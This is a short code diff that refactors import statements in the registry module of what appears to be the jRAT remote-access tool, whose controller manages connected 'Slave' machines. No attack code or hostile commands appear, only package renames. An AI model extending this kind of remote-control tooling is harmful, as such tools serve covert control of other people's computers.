@@ -2,11 +2,10 @@ package jrat.module.registry;
 
 import apiv2.ControllerModule;
 import iconlib.IconUtils;
-import io.jrat.controller.AbstractSlave;
-import io.jrat.controller.Slave;
-import io.jrat.controller.packets.incoming.IncomingPackets;
-import io.jrat.controller.ui.frames.Frame;
-import io.jrat.controller.ui.panels.PanelMainClients;
+import jrat.controller.AbstractSlave;
+import jrat.controller.Slave;
+import jrat.controller.packets.incoming.IncomingPackets;
+import jrat.controller.ui.frames.Frame;
 
 import javax.swing.*;
 import java.awt.event.ActionEvent;
